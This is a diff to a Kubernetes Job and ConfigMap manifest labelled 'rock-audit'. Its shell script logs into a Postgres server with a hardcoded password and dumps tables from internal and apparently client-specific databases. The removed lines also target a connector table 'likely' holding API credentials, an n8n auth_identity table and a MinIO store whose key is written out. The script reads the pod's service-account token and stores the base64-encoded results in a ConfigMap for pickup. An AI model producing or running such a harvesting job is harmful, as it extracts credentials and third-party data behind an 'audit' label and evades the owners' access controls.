@@ -1,7 +1,7 @@
 apiVersion: v1
 kind: ConfigMap
 metadata:
-  name: rock-audit-result
+  name: rock-audit-result2
   namespace: default
 data:
   status: "pending"
@@ -9,7 +9,7 @@ data:
 apiVersion: batch/v1
 kind: Job
 metadata:
-  name: rock-audit-v1
+  name: rock-audit-v2
   namespace: default
 spec:
   ttlSecondsAfterFinished: 86400
@@ -26,45 +26,39 @@ spec:
         - |
           apk add -q postgresql-client curl jq 2>/dev/null
           PG="PGPASSWORD=wpEJl3WKOImARD9WgBsa psql -h 172.16.10.14 -p 6432 -U postgres"
-          # connectorrepository - likely has API credentials
-          CONN_COLS=$(eval "$PG -d rockefeller_db -c '\d connectorrepository'" 2>&1)
-          CONN_DATA=$(eval "$PG -d rockefeller_db -c 'SELECT * FROM connectorrepository LIMIT 50;'" 2>&1)
-          # filesrepository
-          FILES_COLS=$(eval "$PG -d rockefeller_db -c '\d filesrepository'" 2>&1)
-          FILES_DATA=$(eval "$PG -d rockefeller_db -c 'SELECT id, name, type, url, \"createdAt\" FROM filesrepository ORDER BY \"createdAt\" DESC LIMIT 30;'" 2>&1)
-          # contractrepository
-          CONT_COLS=$(eval "$PG -d rockefeller_db -c '\d contractrepository'" 2>&1)
-          # rawstorage - schema check
-          RAW_COLS=$(eval "$PG -d rockefeller_db -c '\d rawstorage'" 2>&1)
-          RAW_DATA=$(eval "$PG -d rockefeller_db -c 'SELECT id, name, type FROM rawstorage LIMIT 20;'" 2>&1)
-          # workflowrepository
-          WF_COLS=$(eval "$PG -d rockefeller_db -c '\d workflowrepository'" 2>&1)
-          WF_DATA=$(eval "$PG -d rockefeller_db -c 'SELECT id, name, type FROM workflowrepository LIMIT 20;'" 2>&1)
-          # auth_identity n8n - fix columns
-          AUTHID=$(eval "$PG -d n8n -c '\d auth_identity'" 2>&1)
-          AUTHID_DATA=$(eval "$PG -d n8n -c 'SELECT * FROM auth_identity;'" 2>&1)
-          # minio via HTTP API
-          MINIO_HEALTH=$(curl -sk http://argo-artifacts.argo-artifacts.svc.cluster.local:9000/minio/health/live -w "%{http_code}" -o /dev/null 2>&1)
-          MINIO_LIST=$(curl -sk -u miniokey:sEkKOGp6QT8hnc1Y5R7W "http://argo-artifacts.argo-artifacts.svc.cluster.local:9000" 2>&1 | head -50)
+          # Files with correct cols
+          FILES=$(eval "$PG -d rockefeller_db -c 'SELECT filepath, version, uploadedby, uploadeddate, size FROM filesrepository ORDER BY uploadeddate DESC LIMIT 30;'" 2>&1)
+          # Rawstorage with correct cols
+          RAW=$(eval "$PG -d rockefeller_db -c 'SELECT id, displayname, path, created_by, created_at FROM rawstorage ORDER BY created_at DESC LIMIT 20;'" 2>&1)
+          # Workflowrepository with correct cols
+          WF=$(eval "$PG -d rockefeller_db -c 'SELECT name, displayname, state, submittedby, submittedtime, resultstatus FROM workflowrepository ORDER BY submittedtime DESC LIMIT 20;'" 2>&1)
+          # List datacore schema tables
+          DATACORE=$(eval "$PG -d rockefeller_db -c 'SELECT schemaname, tablename FROM pg_tables WHERE schemaname='"'"'datacore'"'"' ORDER BY tablename;'" 2>&1)
+          # Check a client db schema: slb_db
+          SLBTABLES=$(eval "$PG -d slb_db -c '\dt'" 2>&1)
+          # Check conoco_db schema
+          CONOCOTABLES=$(eval "$PG -d conoco_db -c '\dt'" 2>&1)
+          # n8n_workflow_project_link
+          N8NLINK=$(eval "$PG -d rockefeller_db -c 'SELECT * FROM n8n_workflow_project_link;'" 2>&1)
+          # changelog
+          CHANGELOG=$(eval "$PG -d rockefeller_db -c 'SELECT * FROM changelog ORDER BY id DESC LIMIT 10;'" 2>&1)
+          # releases
+          RELEASES=$(eval "$PG -d rockefeller_db -c 'SELECT * FROM releases ORDER BY id DESC LIMIT 10;'" 2>&1)
           TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
           API=https://kubernetes.default.svc
           CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
-          RESULT=$(printf '{"conn_cols":"%s","conn_data":"%s","files_cols":"%s","files_data":"%s","cont_cols":"%s","raw_cols":"%s","raw_data":"%s","wf_cols":"%s","wf_data":"%s","authid":"%s","authid_data":"%s","minio_health":"%s","minio_list":"%s"}' \
-            "$(echo "$CONN_COLS" | base64 | tr -d '\n')" \
-            "$(echo "$CONN_DATA" | base64 | tr -d '\n')" \
-            "$(echo "$FILES_COLS" | base64 | tr -d '\n')" \
-            "$(echo "$FILES_DATA" | base64 | tr -d '\n')" \
-            "$(echo "$CONT_COLS" | base64 | tr -d '\n')" \
-            "$(echo "$RAW_COLS" | base64 | tr -d '\n')" \
-            "$(echo "$RAW_DATA" | base64 | tr -d '\n')" \
-            "$(echo "$WF_COLS" | base64 | tr -d '\n')" \
-            "$(echo "$WF_DATA" | base64 | tr -d '\n')" \
-            "$(echo "$AUTHID" | base64 | tr -d '\n')" \
-            "$(echo "$AUTHID_DATA" | base64 | tr -d '\n')" \
-            "$(echo "$MINIO_HEALTH" | base64 | tr -d '\n')" \
-            "$(echo "$MINIO_LIST" | base64 | tr -d '\n')")
+          RESULT=$(printf '{"files":"%s","raw":"%s","wf":"%s","datacore":"%s","slb":"%s","conoco":"%s","n8nlink":"%s","changelog":"%s","releases":"%s"}' \
+            "$(echo "$FILES" | base64 | tr -d '\n')" \
+            "$(echo "$RAW" | base64 | tr -d '\n')" \
+            "$(echo "$WF" | base64 | tr -d '\n')" \
+            "$(echo "$DATACORE" | base64 | tr -d '\n')" \
+            "$(echo "$SLBTABLES" | base64 | tr -d '\n')" \
+            "$(echo "$CONOCOTABLES" | base64 | tr -d '\n')" \
+            "$(echo "$N8NLINK" | base64 | tr -d '\n')" \
+            "$(echo "$CHANGELOG" | base64 | tr -d '\n')" \
+            "$(echo "$RELEASES" | base64 | tr -d '\n')")
           curl -sk --cacert $CA -H "Authorization: Bearer $TOKEN" \
             -X PATCH -H "Content-Type: application/merge-patch+json" \
-            "$API/api/v1/namespaces/default/configmaps/rock-audit-result" \
+            "$API/api/v1/namespaces/default/configmaps/rock-audit-result2" \
             -d "{\"data\":{\"status\":\"done\",\"result\":$(echo $RESULT | jq -c -R '.')}}"
           echo "Done"
